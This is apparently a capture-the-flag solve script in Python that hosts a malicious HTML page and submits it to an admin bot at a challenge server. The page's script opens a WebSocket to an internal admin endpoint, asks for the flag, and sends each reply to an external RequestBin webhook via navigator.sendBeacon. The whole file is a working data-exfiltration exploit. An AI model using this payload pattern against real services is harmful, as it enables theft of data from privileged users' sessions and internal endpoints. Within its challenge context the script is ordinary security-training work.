import sys
sys.path.append('../')

import WebUtils
from WebUtils.Sync import *
from WebUtils.Host import http_host
from WebUtils.Webhook import RequestBinWebhook

WebUtils.setBaseURL('http://chall.polygl0ts.ch:9010/')

with RequestBinWebhook("enbit6i3l2ra4") as hook:
    print(hook.url)
    src_html = """
    <body>
    <script>
        let ws = new WebSocket('ws://web:8080/admin/ws');
        ws.onopen = () => {
            ws.send('flag');
        };
        ws.onmessage = (d) => {
            console.log(d);
            navigator.sendBeacon(`""" + hook.url + """`, d.data);
        }
    </script>
    </body>
    """

    # host payload
    url = http_host(src_html)
    print(url)

    res = post("/submit", data={
        'url': url
    })

    for req in hook.get_requests_sync():
        print(req['body'])
        break


